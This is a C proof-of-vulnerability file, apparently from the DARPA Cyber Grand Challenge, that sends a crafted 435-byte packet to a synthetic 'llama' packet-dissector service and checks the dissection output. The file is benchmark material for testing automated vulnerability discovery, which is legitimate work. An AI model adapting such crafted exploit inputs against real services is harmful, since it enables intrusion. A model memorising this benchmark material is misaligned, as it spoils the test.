#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb3\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x9b\x01\x00\x00\x93\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x93\x01\x00\x00"
         "\x66\x8e\xa5\x2b\x9e\x25\xf3\xfe\xd4\x87\xe1\xc2\xf0\x38\x3d\x30"
         "\xd7\x67\xfc\x08\x4e\x00\x00\x00\x01\x00\x70\x9a\x1a\x4a\xb0\x9c"
         "\x02\xf7\xdc\x7b\xf2\x82\x63\xf4\xe4\xd1\x6d\x54\x76\x10\xa9\x21"
         "\x62\x87\x3d\x01\x81\x01\x00\xae\x01\x00\xfd\xe8\xce\x40\xd0\xd3"
         "\xd7\xba\x4a\x0a\x85\x29\x41\x00\x55\x99\xcd\x38\xe8\x3a\x1c\xc0"
         "\x6b\x18\xaf\x6b\x01\xfb\x7d\x95\x9a\xd7\x37\x22\x01\x44\x3b\xcb"
         "\xbb\x1c\x78\xd2\xd4\x33\x41\xa1\x8d\x2f\x8b\xb8\xba\x01\x01\x00"
         "\xcf\xff\x9f\x9f\x72\x57\x58\xb0\x93\x7c\x55\x72\x5b\x92\x40\x07"
         "\x89\x3a\x2c\xac\xef\x9c\x95\x44\xe2\x72\x97\x50\xee\x03\xf3\x83"
         "\x06\x06\x32\xf6\x50\x51\x0a\x4a\x5c\xb4\x43\xc1\xa4\x56\xaf\x14"
         "\x32\x38\x43\xf1\x2d\xeb\xdd\xc3\x2b\x41\x44\xeb\xe3\xe1\xcb\x47"
         "\x17\xb8\x92\x91\x3f\x2f\x2d\xe3\x0e\xe8\xa5\xc2\xcf\xf6\xff\x5e"
         "\xeb\xcf\x75\x51\x9c\x6c\xd8\x84\x0d\xbf\xe2\x85\xd0\xb9\x18\x43"
         "\x15\xcf\x9d\xa2\x8d\x77\x09\x32\x9b\x44\xb1\xb5\x36\xca\xb2\x81"
         "\x80\x7d\xfa\x5c\x85\x37\x44\xcf\xa3\x51\x62\x30\xa3\xc2\x0b\x2c"
         "\xb8\xe7\x9f\x8c\x93\xdc\x32\xee\x1a\x3a\xad\xba\xe7\x27\x19\x94"
         "\xf9\xc6\x63\x8d\x54\x64\x5e\x32\xf4\xd5\x1b\x96\x71\x08\x2f\xcd"
         "\x91\xe3\xc6\x83\xf5\x05\xfb\x10\x51\x1a\x9d\x7a\x2b\x9e\x97\x38"
         "\x1a\x3d\x73\xf9\xe5\xa2\xcf\x76\x62\xc2\xca\xd2\xf5\x1e\xd5\xaa"
         "\xcf\x7c\xff\x3c\x80\x7d\x03\xcd\xcb\x96\x05\x48\x14\xdb\x4f\x89"
         "\xb6\x20\xa3\xe0\xc6\xda\xa0\x33\x69\x57\xdf\xcf\xbd\xe4\x8c\xe4"
         "\x80\x73\xb6\xf1\x75\x20\xbe\x03\x7a\xaf\x83\x78\xf6\xcd\xc6\xd9"
         "\x40\x95\xf4\x9c\x19\x04\xa0\xfe\xf7\x81\x12\x5c\x49\x75\x6a\xa6"
         "\x52\xcf\x80\x01\x45\xe0\xd3\xc2\x06\x01\x00\x13\x72\x7c\x01\x57"
         "\x41\x00\xcc\x8e\x95\xca\xf1\xd2\x29\x16\xf5\x86\xcb\x8c\x48\x41"
         "\x00\x83\x36";
      static unsigned int write_00001_00000_len = 435;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaworshipability
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x77\x6f\x72\x73\x68\x69"
         "\x70\x61\x62\x69\x6c\x69\x74\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
